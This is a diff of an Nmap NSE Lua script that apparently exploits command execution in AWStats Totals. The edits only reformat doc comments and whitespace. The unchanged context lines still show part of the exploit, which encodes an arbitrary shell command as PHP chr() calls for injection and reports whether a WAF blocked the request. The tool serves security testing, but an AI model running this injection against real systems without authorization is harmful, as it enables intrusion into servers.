@@ -48,10 +48,10 @@ local DEFAULT_URI = "index.php"
 
 ---
 --Writes string to file
--- () param filename Filename to write
--- () param content Content string
--- () return boolean status
--- () return string error
+-- @param filename Filename to write
+-- @param content Content string
+-- @return boolean status
+-- @return string error
 --Taken from: hostmap.nse
 local function write_file(filename, contents)
   local f, err = io.open(filename, "w")
@@ -65,10 +65,10 @@ end
 
 ---
 --Checks if Awstats Totals installation seems to be there
--- () param host Host table
--- () param port Port table
--- () param path Path pointing to AWStats Totals
--- () return true if awstats totals is found
+-- @param host Host table
+-- @param port Port table
+-- @param path Path pointing to AWStats Totals
+-- @return true if awstats totals is found
 local function check_installation(host, port, path)
   local check_req = http.get(host, port, path)
   if not(http.response_contains(check_req, "AWStats")) then
@@ -94,7 +94,7 @@ action = function(host, port)
   end
   output[#output+1] = "Command:"..cmd
   
-  --Encode payload using PHP's chr()  
+  --Encode payload using PHP's chr() 
   local encoded_payload = ""
   cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
   if string.sub(encoded_payload, #encoded_payload) == "." then
@@ -118,7 +118,7 @@ action = function(host, port)
     end
 
   else
-    if nmap.verbosity() >= 2 then
+    if nmap.verbosity()>= 2 then
       output[#output+1] = "[Error] Request did not return 200. Make sure your URI value is correct. A WAF might be blocking your request"
     end
   end
